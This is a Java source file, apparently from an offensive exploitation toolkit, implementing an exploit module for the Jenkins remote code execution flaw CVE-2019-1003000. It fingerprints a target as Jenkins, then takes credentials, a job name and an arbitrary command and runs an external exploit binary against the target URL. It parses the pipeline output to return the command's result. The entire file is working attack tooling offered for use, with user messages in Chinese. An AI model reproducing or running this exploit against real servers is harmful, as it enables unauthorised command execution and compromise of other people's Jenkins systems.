package fun.fireline.exp.jenkins;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.Jenkins_Info;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class CVE_2019_1003000 implements ExploitInterface {

    private String url = "";
    private boolean isVul = false;
    private Jenkins_Info jenkins_info = new Jenkins_Info();

    @Override
    public String checkVul(String url) {
        this.url = url;
        String version = jenkins_info.get_Jenkions_Info(url);
        if(version==null){
            return "[-] 目标非Jenkins";
        }
        this.isVul = true;
        return "[?] 目标可能存在CVE-2019-1003000 Jenkins 远程代码执行,但需要提供job,username,password参数,请从文件读取/命令执行模块进行判断 eg: user1|user1|my-pipeline|ls (username|password|jobname|command)";
    }

    @Override
    public String exeCmd(String cmd, String encoding) {
        String regex = "^[a-zA-Z0-9]+\\s*\\|\\s*[a-zA-Z0-9]+\\s*\\|\\s*[a-zA-Z0-9-]+\\s*\\|\\s*.+\\s*$";
        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(cmd);
        if(!matcher.matches()){
            return "提供的job,username,password参数格式不对,eg: user1|user1|my-pipeline|ls (username|password|jobname|command)";
        }
        String[] all = cmd.split("\\|",4);
        String username = all[0];
        String password  = all[1];
        String jobname = all[2];
        String execute = all[3];
        String os = jenkins_info.getSystem();
        String poc = " --url %s --job %s --username %s --password %s --cmd \"%s\"";
        String line = "";
        String lines = "";
        String exp = "";
        try{
            if(os.contains("win")){
                exp = "CVE_2019_1003000.exe";
            }else{
                exp = "./CVE_2019_1003000";
            }
            exp = exp + String.format(poc,url,jobname,username,password,execute);
            System.out.println("exp: "+exp);
            Process process = Runtime.getRuntime().exec(exp);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            while ((line = reader.readLine()) != null) {
                lines += line + "\n";
            }
            process.waitFor(30, TimeUnit.SECONDS);
            if (!lines.contains("OUTPUT")) {
                return "命令执行失败,有以下可能:username,password,jobname错误,或者该目标不存在CVE-2019-1003000漏洞";
            }
            if (lines.contains("Finished: SUCCESS")) {
                String startDelimiter = "\\[Pipeline\\] echo";
                String endDelimiter = "\\[Pipeline\\] End of Pipeline";
                pattern = Pattern.compile(startDelimiter + "(.*?)" + endDelimiter, Pattern.DOTALL);
                matcher = pattern.matcher(lines);
                String content = "";
                if (matcher.find()) {
                    content = matcher.group(1).trim();
                }
                return "命令执行成功:\n" + content;
            } else if (lines.contains("Finished: FAILURE")) {
                String content = "";
                String[] lines2 = lines.split("\n");
                for (int i = 0; i < lines2.length; i++) {
                    if (lines2[i].startsWith("[Pipeline] End of Pipeline")) {
                        if (i + 2 < lines2.length) {
                            content = lines2[i + 2];
                        }
                        break;
                    }
                }
                return "命令执行失败:\n" + content;
            }
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
        return "命令执行失败,有以下可能:username,password,jobname错误,或者该目标不存在CVE-2019-1003000漏洞";
    }


    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
